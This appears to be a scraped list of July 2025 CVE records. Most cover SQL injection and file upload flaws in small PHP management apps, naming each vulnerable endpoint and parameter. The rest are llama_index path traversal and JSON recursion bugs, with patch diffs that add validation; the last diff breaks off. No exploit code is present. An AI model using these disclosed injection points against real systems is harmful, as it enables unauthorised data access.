Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315044 ---
id

================================================================================


CVE ID: CVE-2025-7131
Published: 2025-07-07T14:15:26.707
Modified: 2025-07-08T18:28:00.197
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Payroll Management System 1.0. It has been declared as critical. Affected by this vulnerability is an unknown functionality of the file /ajax.php?action=save_employee_attendance. The manipulation of the argument employee_id leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/wyl091256/CVE/issues/19 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.315043 [Permissions Required]
  3. https://vuldb.com/?id.315043 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605949 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315043 ---
employee_id

================================================================================


CVE ID: CVE-2025-7130
Published: 2025-07-07T14:15:26.497
Modified: 2025-07-08T18:28:09.443
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Payroll Management System 1.0. It has been classified as critical. Affected is an unknown function of the file /ajax.php?action=delete_payroll. The manipulation of the argument ID leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/wyl091256/CVE/issues/17 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.315042 [Permissions Required]
  3. https://vuldb.com/?id.315042 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605948 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315042 ---
id

================================================================================


CVE ID: CVE-2025-7129
Published: 2025-07-07T13:15:29.627
Modified: 2025-07-08T18:28:17.207
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Payroll Management System 1.0 and classified as critical. This issue affects some unknown processing of the file /ajax.php?action=delete_employee_attendance_single. The manipulation of the argument ID leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/wyl091256/CVE/issues/16 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.315041 [Permissions Required]
  3. https://vuldb.com/?id.315041 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605946 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315041 ---
id

================================================================================


CVE ID: CVE-2025-7128
Published: 2025-07-07T13:15:29.427
Modified: 2025-07-08T18:28:35.423
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in Campcodes Payroll Management System 1.0 and classified as critical. This vulnerability affects unknown code of the file /ajax.php?action=calculate_payroll. The manipulation of the argument ID leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/wyl091256/CVE/issues/15 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.315040 [Permissions Required]
  3. https://vuldb.com/?id.315040 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605945 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]
  6. https://github.com/wyl091256/CVE/issues/15 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315040 ---
id

================================================================================


CVE ID: CVE-2025-6209
Published: 2025-07-07T13:15:28.823
Modified: 2025-07-30T20:01:32.410
CVSS Score: 7.5 (HIGH) [v3.0]
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-29: CWE-29

Description:
A path traversal vulnerability exists in run-llama/llama_index versions 0.12.27 through 0.12.40, specifically within the `encode_image` function in `generic_utils.py`. This vulnerability allows an attacker to manipulate the `image_path` input to read arbitrary files on the server, including sensitive system files. The issue arises due to improper validation or sanitization of the file path, enabling path traversal sequences to access files outside the intended directory. The vulnerability is fixed in version 0.12.41.

References (3):
  1. https://github.com/run-llama/llama_index/commit/cdeaab91a204d1c3527f177dac37390327aef274 [Patch]
  2. https://huntr.com/bounties/e89d14f8-bfe8-4c9a-bb2a-656c01cc9a68 [Exploit, Third Party Advisory]
  3. https://huntr.com/bounties/e89d14f8-bfe8-4c9a-bb2a-656c01cc9a68 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/run-llama/llama_index/commit/cdeaab91a204d1c3527f177dac37390327aef274 ---
From cdeaab91a204d1c3527f177dac37390327aef274 Mon Sep 17 00:00:00 2001
From: "Clelia (Astra) Bertelli" <133636879+AstraBert@users.noreply.github.com>
Date: Tue, 3 Jun 2025 19:29:18 +0200
Subject: [PATCH] ImageDocument path and url checking to ensure that the input
 is really an image (#18947)

* ImageDocument path and url checking to ensure that the input is really an image

* Correcting tests to fit new image validation

* Adjust test pt2
---
 llama-index-core/llama_index/core/schema.py   | 26 ++++++++++++
 .../multi_modal_llms/test_generic_utils.py    | 34 +++++++++++-----
 .../tests/schema/test_image_document.py       | 36 +++++++++++++++++
 llama-index-core/tests/schema/test_schema.py  | 40 +++++++++++++------
 4 files changed, 113 insertions(+), 23 deletions(-)
 create mode 100644 llama-index-core/tests/schema/test_image_document.py

diff --git a/llama-index-core/llama_index/core/schema.py b/llama-index-core/llama_index/core/schema.py
index b024abaa0e..f98ce774f1 100644
--- a/llama-index-core/llama_index/core/schema.py
+++ b/llama-index-core/llama_index/core/schema.py
@@ -32,6 +32,7 @@
 from dataclasses_json import DataClassJsonMixin
 from deprecated import deprecated
 from typing_extensions import Self
+from PIL import Image
 
 from llama_index.core.bridge.pydantic import (
     AnyUrl,
@@ -1220,6 +1221,27 @@ def from_cloud_document(
         )
 
 
+def is_image_pil(file_path: str) -> bool:
+    try:
+        with Image.open(file_path) as img:
+            img.verify()  # Verify it's a valid image
+        return True
+    except (IOError, SyntaxError):
+        return False
+
+
+def is_image_url_pil(url: str) -> bool:
+    try:
+        response = requests.get(url, stream=True)
+        response.raise_for_status()  # Raise an exception for bad status codes
+        # Open image from the response content
+        img = Image.open(BytesIO(response.content))
+        img.verify()
+        return True
+    except (requests.RequestException, IOError, SyntaxError):
+        return False
+
+
 class ImageDocument(Document):
     """Backward compatible wrapper around Document containing an image."""
 
@@ -1235,10 +1257,14 @@ def __init__(self, **kwargs: Any) -> None:
                 data=image, mimetype=image_mimetype
             )
         elif image_path:
+            if not is_image_pil(image_path):
+                raise ValueError("The specified file path is not an accessible image")
             kwargs["image_resource"] = MediaResource(
                 path=image_path, mimetype=image_mimetype
             )
         elif image_url:
+            if not is_image_url_pil(image_url):
+                raise ValueError("The specified URL is not an accessible image")
             kwargs["image_resource"] = MediaResource(
                 url=image_url, mimetype=image_mimetype
             )
diff --git a/llama-index-core/tests/multi_modal_llms/test_generic_utils.py b/llama-index-core/tests/multi_modal_llms/test_generic_utils.py
index 1c3d173d47..3389427b50 100644
--- a/llama-index-core/tests/multi_modal_llms/test_generic_utils.py
+++ b/llama-index-core/tests/multi_modal_llms/test_generic_utils.py
@@ -2,6 +2,8 @@
 
 import pytest
 import base64
+import httpx
+from pathlib import Path
 from unittest.mock import mock_open, patch, MagicMock
 
 from llama_index.core.schema import ImageDocument
@@ -16,7 +18,9 @@
 )
 
 # Expected values
-EXP_IMAGE_URLS = ["http://example.com/image1.jpg"]
+EXP_IMAGE_URLS = [
+    "https://astrabert.github.io/hophop-science/images/whale_doing_science.png"
+]
 EXP_BASE64 = "SGVsbG8gV29ybGQ="  # "Hello World" in base64
 EXP_BINARY = b"Hello World"
 
@@ -51,22 +55,26 @@ def test_encode_image():
     assert result == EXP_BASE64
 
 
-def test_image_documents_to_base64_multiple_sources():
+def test_image_documents_to_base64_multiple_sources(tmp_path: Path):
     """Test converting multiple ImageDocuments with different source types."""
+    content = httpx.get(EXP_IMAGE_URLS[0]).content
+    expected_b64 = base64.b64encode(content).decode("utf-8")
+    fl_path = tmp_path / "test_image.png"
+    fl_path.write_bytes(content)
     documents = [
-        ImageDocument(image=EXP_BASE64),
-        ImageDocument(image_path="test.jpg"),
+        ImageDocument(image=expected_b64),
+        ImageDocument(image_path=fl_path),
         ImageDocument(metadata={"file_path": "test.jpg"}),
         ImageDocument(image_url=EXP_IMAGE_URLS[0]),
     ]
     with patch("requests.get") as mock_get:
-        mock_get.return_value.content = EXP_BINARY
+        mock_get.return_value.content = content
         with patch("os.path.isfile", return_value=True):
-            with patch("builtins.open", mock_open(read_data=EXP_BINARY)):
+            with patch("builtins.open", mock_open(read_data=content)):
                 result = image_documents_to_base64(documents)
 
     assert len(result) == 4
-    assert all(encoding == EXP_BASE64 for encoding in result)
+    assert all(encoding == expected_b64 for encoding in result)
 
 
 def test_image_documents_to_base64_failed_url():
@@ -136,11 +144,15 @@ def test_infer_image_mimetype_from_file_path():
     assert infer_image_mimetype_from_file_path("") == "image/jpeg"
 
 
-def test_set_base64_and_mimetype_for_image_docs():
+def test_set_base64_and_mimetype_for_image_docs(tmp_path: Path):
     """Test setting base64 and mimetype fields for ImageDocument objects."""
+    content = httpx.get(EXP_IMAGE_URLS[0]).content
+    expected_b64 = base64.b64encode(content).decode("utf-8")
+    fl_path = tmp_path / "test_image.png"
+    fl_path.write_bytes(content)
     image_docs = [
-        ImageDocument(image=EXP_BASE64),
-        ImageDocument(image_path="test.asdf"),
+        ImageDocument(image=expected_b64),
+        ImageDocument(image_path=fl_path.__str__()),
     ]
 
     with patch("requests.get") as mock_get:
@@ -151,6 +163,6 @@ def test_set_base64_and_mimetype_for_image_docs():
                 results = set_base64_and_mimetype_for_image_docs(image_docs)
 
     assert len(results) == 2
-    assert results[0].image == EXP_BASE64
+    assert results[0].image == expected_b64
     assert results[0].image_mimetype == "image/jpeg"
     assert results[1].image_mimetype == "image/jpeg"
diff --git a/llama-index-core/tests/schema/test_image_document.py b/llama-index-core/tests/schema/test_image_document.py
new file mode 100644
index 0000000000..9349ce2fdd
--- /dev/null
+++ b/llama-index-core/tests/schema/test_image_document.py
@@ -0,0 +1,36 @@
+import httpx
+import pytest
+
+from pathlib import Path
+from llama_index.core.schema import ImageDocument
+
+
+@pytest.fixture()
+def image_url() -> str:
+    return "https://astrabert.github.io/hophop-science/images/whale_doing_science.png"
+
+
+def test_real_image_path(tmp_path: Path, image_url: str) -> None:
+    content = httpx.get(image_url).content
+    fl_path = tmp_path / "test_image.png"
+    fl_path.write_bytes(content)
+    doc = ImageDocument(image_path=fl_path.__str__())
+    assert isinstance(doc, ImageDocument)
+
+
+def test_real_image_url(image_url: str) -> None:
+    doc = ImageDocument(image_url=image_url)
+    assert isinstance(doc, ImageDocument)
+
+
+def test_non_image_path(tmp_path: Path) -> None:
+    fl_path = tmp_path / "test_file.txt"
+    fl_path.write_text("Hello world!")
+    with pytest.raises(expected_exception=ValueError):
+        doc = ImageDocument(image_path=fl_path.__str__())
+
+
+def test_non_image_url(image_url: str) -> None:
+    image_url = image_url.replace("png", "txt")
+    with pytest.raises(expected_exception=ValueError):
+        doc = ImageDocument(image_url=image_url)
diff --git a/llama-index-core/tests/schema/test_schema.py b/llama-index-core/tests/schema/test_schema.py
index 6de560d980..96f0088a5c 100644
--- a/llama-index-core/tests/schema/test_schema.py
+++ b/llama-index-core/tests/schema/test_schema.py
@@ -1,4 +1,5 @@
 import base64
+import httpx
 import logging
 from io import BytesIO
 from pathlib import Path
@@ -250,17 +251,27 @@ def test_image_document_image():
     assert doc.image == "MTIzNDU2Nzg5"
 
 
-def test_image_document_path():
-    mock_path = Path(__file__)
-    doc = ImageDocument(id_="test", image_path=mock_path)
-    assert doc.image_path == str(mock_path)
-    doc.image_path = str(mock_path.parent)
-    assert doc.image_path == str(mock_path.parent)
+def test_image_document_path(tmp_path: Path):
+    content = httpx.get(
+        "https://astrabert.github.io/hophop-science/images/whale_doing_science.png"
+    ).content
+    fl_path = tmp_path / "test_image.png"
+    fl_path.write_bytes(content)
+    doc = ImageDocument(id_="test", image_path=fl_path)
+    assert doc.image_path == str(fl_path)
+    doc.image_path = str(fl_path.parent)
+    assert doc.image_path == str(fl_path.parent)
 
 
 def test_image_document_url():
-    doc = ImageDocument(id_="test", image_url="https://example.com/")
-    assert doc.image_url == "https://example.com/"
+    doc = ImageDocument(
+        id_="test",
+        image_url="https://astrabert.github.io/hophop-science/images/whale_doing_science.png",
+    )
+    assert (
+        doc.image_url
+        == "https://astrabert.github.io/hophop-science/images/whale_doing_science.png"
+    )
     doc.image_url = "https://foo.org"
     assert doc.image_url == "https://foo.org/"
 
@@ -281,12 +292,17 @@ def test_image_document_embeddings():
     assert doc.text_resource.embeddings == {"dense": [1.0, 2.0, 3.0]}
 
 
-def test_image_document_path_serialization():
-    doc = ImageDocument(image_path=Path("test.png"))
-    assert doc.model_dump()["image_resource"]["path"] == "test.png"
+def test_image_document_path_serialization(tmp_path: Path):
+    content = httpx.get(
+        "https://astrabert.github.io/hophop-science/images/whale_doing_science.png"
+    ).content
+    fl_path = tmp_path / "test_image.png"
+    fl_path.write_bytes(content)
+    doc = ImageDocument(image_path=fl_path)
+    assert doc.model_dump()["image_resource"]["path"] == fl_path.__str__()
 
     new_doc = ImageDocument(**doc.model_dump())
-    assert new_doc.image_resource.path == Path("test.png")
+    assert new_doc.image_resource.path == fl_path
 
 
 def test_image_block_resolve_image(png_1px: bytes, png_1px_b64: bytes):


================================================================================


CVE ID: CVE-2025-7127
Published: 2025-07-07T12:15:23.947
Modified: 2025-07-08T18:29:02.537
CVSS Score: 4.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, was found in itsourcecode Employee Management System up to 1.0. This affects an unknown part of the file /admin/changepassword.php. The manipulation of the argument currentpassword leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/manyufann/CVE/issues/3 [Exploit, Third Party Advisory]
  2. https://itsourcecode.com/ [Product]
  3. https://vuldb.com/?ctiid.315039 [Permissions Required]
  4. https://vuldb.com/?id.315039 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605935 [Third Party Advisory, VDB Entry]
  6. https://github.com/manyufann/CVE/issues/3 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315039 ---
currentpassword

================================================================================


CVE ID: CVE-2025-7126
Published: 2025-07-07T12:15:23.347
Modified: 2025-07-08T18:29:12.300
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability, which was classified as critical, has been found in itsourcecode Employee Management System up to 1.0. Affected by this issue is some unknown functionality of the file /admin/adminprofile.php. The manipulation of the argument AdminName leads to sql injection. The attack may be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/manyufann/CVE/issues/2 [Exploit, Third Party Advisory]
  2. https://itsourcecode.com/ [Product]
  3. https://vuldb.com/?ctiid.315038 [Permissions Required]
  4. https://vuldb.com/?id.315038 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605934 [Third Party Advisory, VDB Entry]
  6. https://github.com/manyufann/CVE/issues/2 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315038 ---
AdminName

================================================================================


CVE ID: CVE-2025-7125
Published: 2025-07-07T11:15:52.217
Modified: 2025-07-08T18:29:21.273
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical was found in itsourcecode Employee Management System up to 1.0. Affected by this vulnerability is an unknown functionality of the file /admin/editempeducation.php. The manipulation of the argument coursepg leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/manyufann/CVE/issues/1 [Exploit, Third Party Advisory]
  2. https://itsourcecode.com/ [Product]
  3. https://vuldb.com/?ctiid.315037 [Permissions Required]
  4. https://vuldb.com/?id.315037 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605933 [Third Party Advisory, VDB Entry]
  6. https://github.com/manyufann/CVE/issues/1 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315037 ---
coursepg

================================================================================


CVE ID: CVE-2025-7124
Published: 2025-07-07T11:15:51.483
Modified: 2025-07-08T18:29:28.530
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-284: CWE-284
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
A vulnerability classified as critical has been found in code-projects Online Note Sharing 1.0. Affected is an unknown function of the file /dashboard/userprofile.php of the component Profile Image Handler. The manipulation of the argument image leads to unrestricted upload. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://code-projects.org/ [Product]
  2. https://github.com/yihaofuweng/cve/issues/2 [Exploit, Third Party Advisory]
  3. https://vuldb.com/?ctiid.315036 [Permissions Required]
  4. https://vuldb.com/?id.315036 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605925 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315036 ---
image

================================================================================


CVE ID: CVE-2025-7123
Published: 2025-07-07T10:15:29.580
Modified: 2025-07-08T18:29:37.083
CVSS Score: 4.7 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Complaint Management System 1.0. It has been rated as critical. This issue affects some unknown processing of the file /admin/complaint-details.php. The manipulation of the argument cid/uid leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://github.com/y2xsec324/cve/issues/2 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.315035 [Permissions Required]
  3. https://vuldb.com/?id.315035 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605927 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.605929 [Not Applicable]
  6. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315035 ---
cid/uid

================================================================================


CVE ID: CVE-2025-7122
Published: 2025-07-07T10:15:29.333
Modified: 2025-07-08T18:29:46.427
CVSS Score: 7.3 (HIGH) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability was found in Campcodes Complaint Management System 1.0. It has been declared as critical. This vulnerability affects unknown code of the file /admin/index.php. The manipulation of the argument Username leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/ez-lbz/poc/issues/45 [Exploit, Third Party Advisory]
  2. https://vuldb.com/?ctiid.315034 [Permissions Required]
  3. https://vuldb.com/?id.315034 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.605914 [Third Party Advisory, VDB Entry]
  5. https://www.campcodes.com/ [Product]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.315034 ---
username

================================================================================


CVE ID: CVE-2025-6210
Published: 2025-07-07T10:15:29.040
Modified: 2025-07-30T20:01:47.780
CVSS Score: 6.2 (MEDIUM) [v3.0]
CVSS Vector: CVSS:3.0/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability in the ObsidianReader class of the run-llama/llama_index repository, specifically in version 0.12.27, allows for hardlink-based path traversal. This flaw permits attackers to bypass path restrictions and access sensitive system files, such as /etc/passwd, by exploiting hardlinks. The vulnerability arises from inadequate handling of hardlinks in the load_data() method, where the security checks fail to differentiate between real files and hardlinks. This issue is resolved in version 0.5.2.

References (2):
  1. https://github.com/run-llama/llama_index/commit/a86c96ae0e662492eeb471b658ae849a93f628ff [Patch]
  2. https://huntr.com/bounties/a654b322-a509-4448-a1f5-0f22850b4687 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/run-llama/llama_index/commit/a86c96ae0e662492eeb471b658ae849a93f628ff ---
From a86c96ae0e662492eeb471b658ae849a93f628ff Mon Sep 17 00:00:00 2001
From: "Clelia (Astra) Bertelli" <133636879+AstraBert@users.noreply.github.com>
Date: Tue, 3 Jun 2025 18:13:45 +0200
Subject: [PATCH] Obsidian reader checks and skips hardlinks (#18950)

---
 .../llama_index/readers/obsidian/base.py        | 17 +++++++++++++++++
 .../llama-index-readers-obsidian/pyproject.toml |  2 +-
 2 files changed, 18 insertions(+), 1 deletion(-)

diff --git a/llama-index-integrations/readers/llama-index-readers-obsidian/llama_index/readers/obsidian/base.py b/llama-index-integrations/readers/llama-index-readers-obsidian/llama_index/readers/obsidian/base.py
index cabd3927c2..59456c87f6 100644
--- a/llama-index-integrations/readers/llama-index-readers-obsidian/llama_index/readers/obsidian/base.py
+++ b/llama-index-integrations/readers/llama-index-readers-obsidian/llama_index/readers/obsidian/base.py
@@ -30,6 +30,18 @@
 from llama_index.readers.file import MarkdownReader
 
 
+def is_hardlink(filepath: Path) -> bool:
+    """
+    Check if a file is a hardlink by checking the number of links to/from it.
+
+    Args:
+        filepath (Path): path to the file.
+
+    """
+    stat_info = os.stat(filepath)
+    return stat_info.st_nlink > 1
+
+
 class ObsidianReader(BaseReader):
     """
     input_dir (str): Path to the Obsidian vault.
@@ -68,6 +80,11 @@ def load_data(self, *args: Any, **load_kwargs: Any) -> List[Document]:
                     filepath = os.path.join(dirpath, filename)
                     file_path_obj = Path(filepath).resolve()
                     try:
+                        if is_hardlink(filepath=file_path_obj):
+                            print(
+                                f"Warning: Skipping file because it is a hardlink (potential malicious exploit): {filepath}"
+                            )
+                            continue
                         if not str(file_path_obj).startswith(str(input_dir_abs)):
                             print(
                                 f"Warning: Skipping file outside input directory: {filepath}"
diff --git a/llama-index-integrations/readers/llama-index-readers-obsidian/pyproject.toml b/llama-index-integrations/readers/llama-index-readers-obsidian/pyproject.toml
index 7863f82b5c..bc60675926 100644
--- a/llama-index-integrations/readers/llama-index-readers-obsidian/pyproject.toml
+++ b/llama-index-integrations/readers/llama-index-readers-obsidian/pyproject.toml
@@ -26,7 +26,7 @@ dev = [
 
 [project]
 name = "llama-index-readers-obsidian"
-version = "0.5.1"
+version = "0.5.2"
 description = "llama-index readers obsidian integration"
 authors = [{name = "Your Name", email = "you@example.com"}]
 requires-python = ">=3.9,<4.0"


================================================================================


CVE ID: CVE-2025-5472
Published: 2025-07-07T10:15:28.873
Modified: 2025-07-30T20:03:35.977
CVSS Score: 6.5 (MEDIUM) [v3.0]
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H

CWE Categories:
  - CWE-674: CWE-674

Description:
The JSONReader in run-llama/llama_index versions 0.12.28 is vulnerable to a stack overflow due to uncontrolled recursive JSON parsing. This vulnerability allows attackers to trigger a Denial of Service (DoS) by submitting deeply nested JSON structures, leading to a RecursionError and crashing applications. The root cause is the unsafe recursive traversal design and lack of depth validation, which makes the JSONReader susceptible to stack overflow when processing deeply nested JSON. This impacts the availability of services, making them unreliable and disrupting workflows. The issue is resolved in version 0.12.38.

References (2):
  1. https://github.com/run-llama/llama_index/commit/c032843a02ce38fd8f284b2aa5a37fd1c17ae635 [Patch]
  2. https://huntr.com/bounties/df187bda-7911-4823-a19a-e15b2c66b0d4 [Exploit, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://github.com/run-llama/llama_index/commit/c032843a02ce38fd8f284b2aa5a37fd1c17ae635 ---
From c032843a02ce38fd8f284b2aa5a37fd1c17ae635 Mon Sep 17 00:00:00 2001
From: Massimiliano Pippi <mpippi@gmail.com>
Date: Thu, 29 May 2025 02:32:46 +0200
Subject: [PATCH] fix: prevent DoS attacks in JSONReader (#18877)

---
 .../llama_index/core/readers/json.py          | 97 ++++++++++---------
 llama-index-core/tests/readers/test_json.py   | 32 ++++++
 2 files changed, 85 insertions(+), 44 deletions(-)

diff --git a/llama-index-core/llama_index/core/readers/json.py b/llama-index-core/llama_index/core/readers/json.py
index ef4d4a85d9..cbade70d56 100644
--- a/llama-index-core/llama_index/core/readers/json.py
+++ b/llama-index-core/llama_index/core/readers/json.py
@@ -2,6 +2,7 @@
 
 import json
 import re
+import warnings
 from typing import Any, Dict, Generator, List, Optional
 
 from llama_index.core.readers.base import BaseReader
@@ -97,49 +98,57 @@ def load_data(
         self, input_file: str, extra_info: Optional[Dict] = {}
     ) -> List[Document]:
         """Load data from the input file."""
-        with open(input_file, encoding="utf-8") as f:
-            load_data = []
-            if self.is_jsonl:
-                for line in f:
-                    load_data.append(json.loads(line.strip()))
-            else:
-                load_data = [json.load(f)]
-
-            documents = []
-            for data in load_data:
-                if self.levels_back is None and self.clean_json is True:
-                    # If levels_back isn't set and clean json is set,
-                    # remove lines containing only formatting, we just format and make each
-                    # line an embedding
-                    json_output = json.dumps(
-                        data, indent=0, ensure_ascii=self.ensure_ascii
-                    )
-                    lines = json_output.split("\n")
-                    useful_lines = [
-                        line for line in lines if not re.match(r"^[{}\[\],]*$", line)
-                    ]
-                    documents.append(
-                        Document(text="\n".join(useful_lines), metadata=extra_info)
-                    )
-
-                elif self.levels_back is None and self.clean_json is False:
-                    # If levels_back isn't set  and clean json is False, create documents without cleaning
-                    json_output = json.dumps(data, ensure_ascii=self.ensure_ascii)
-                    documents.append(Document(text=json_output, metadata=extra_info))
-
-                elif self.levels_back is not None:
-                    # If levels_back is set, we make the embeddings contain the labels
-                    # from further up the JSON tree
-                    lines = [
-                        *_depth_first_yield(
-                            data,
-                            self.levels_back,
-                            self.collapse_length,
-                            [],
-                            self.ensure_ascii,
+        try:
+            with open(input_file, encoding="utf-8") as f:
+                load_data = []
+                if self.is_jsonl:
+                    for line in f:
+                        load_data.append(json.loads(line.strip()))
+                else:
+                    load_data = [json.load(f)]
+
+                documents = []
+                for data in load_data:
+                    if self.levels_back is None and self.clean_json is True:
+                        # If levels_back isn't set and clean json is set,
+                        # remove lines containing only formatting, we just format and make each
+                        # line an embedding
+                        json_output = json.dumps(
+                            data, indent=0, ensure_ascii=self.ensure_ascii
+                        )
+                        lines = json_output.split("\n")
+                        useful_lines = [
+                            line
+                            for line in lines
+                            if not re.match(r"^[{}\[\],]*$", line)
+                        ]
+                        documents.append(
+                            Document(text="\n".join(useful_lines), metadata=extra_info)
+                        )
+
+                    elif self.levels_back is None and self.clean_json is False:
+                        # If levels_back isn't set  and clean json is False, create documents without cleaning
+                        json_output = json.dumps(data, ensure_ascii=self.ensure_ascii)
+                        documents.append(
+                            Document(text=json_output, metadata=extra_info)
+                        )
+
+                    elif self.levels_back is not None:
+                        # If levels_back is set, we make the embeddings contain the labels
+                        # from further up the JSON tree
+                        lines = [
+                            *_depth_first_yield(
+                                data,
+                                self.levels_back,
+                                self.collapse_length,
+                                [],
+                                self.ensure_ascii,
+                            )
+                        ]
+                        documents.append(
+                            Document(text="\n".join(lines), metadata=extra_info)
                         )
-                    ]
-                    documents.append(
-                        Document(text="\n".join(lines), metadata=extra_info)
-                    )
             return documents
+        except RecursionError:
+            warnings.warn("Recursion error occurred while processing JSON data.")
+            return []
diff --git a/llama-index-core/tests/readers/test_json.py b/llama-index-core/tests/readers/test_json.py
index eb03db9758..ed00aa8019 100644
--- a/llama-index-core/tests/readers/test_json.py
+++ b/llama-index-core/tests/readers/test_json.py
@@ -1,7 +1,10 @@
 """Test file reader."""
 
+import json
+import sys
 from tempfile import TemporaryDirectory
 
+import pytest
 from llama_index.core.readers.json import JSONReader
 
 
@@ -93,3 +96,32 @@ def test_clean_json() -> None:
         reader1 = JSONReader(clean_json=True)
         data1 = reader1.load_data(file_name)
         assert data1[0].get_content() == '"a": {\n"b": "c"'
+
+
